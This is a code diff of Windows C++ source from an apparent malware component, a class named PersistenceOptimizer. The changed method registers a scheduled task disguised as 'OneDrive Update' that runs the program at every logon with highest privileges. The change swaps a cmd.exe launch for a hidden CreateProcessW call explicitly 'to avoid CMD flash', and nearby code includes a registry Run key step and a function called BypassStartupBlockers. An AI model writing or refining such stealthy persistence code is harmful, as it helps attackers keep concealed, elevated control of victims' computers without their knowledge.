@@ -39,21 +39,19 @@ void PersistenceOptimizer::StartupManager::ApplyMultipleStartupTechniques() {
         RegCloseKey(hKey);
     }
 
-    // 2. Scheduled Task (via schtasks command)
+    // 2. Scheduled Task (via direct CreateProcessW to avoid CMD flash)
     // "schtasks /create /tn \"OneDrive Update\" /tr \"<path>\" /sc onlogon /rl highest /f"
-    std::wstring cmd = L"schtasks /create /tn \"OneDrive Update\" /tr \"" + exePath + L"\" /sc onlogon /rl highest /f";
+    std::wstring cmdLine = L"schtasks /create /tn \"OneDrive Update\" /tr \"\\\"" + exePath + L"\\\"\" /sc onlogon /rl highest /f";
     
-    std::wstring params = L"/c " + cmd;
-    SHELLEXECUTEINFOW sei = { sizeof(sei) };
-    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
-    sei.lpVerb = L"open";
-    sei.lpFile = L"cmd.exe";
-    sei.lpParameters = params.c_str();
-    sei.nShow = SW_HIDE;
+    STARTUPINFOW si = { sizeof(si) };
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    PROCESS_INFORMATION pi = { 0 };
     
-    // Execute async, don't wait
-    ShellExecuteExW(&sei);
-    if (sei.hProcess) CloseHandle(sei.hProcess);
+    if (CreateProcessW(NULL, (LPWSTR)cmdLine.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
 }
 
 void PersistenceOptimizer::StartupManager::BypassStartupBlockers() {
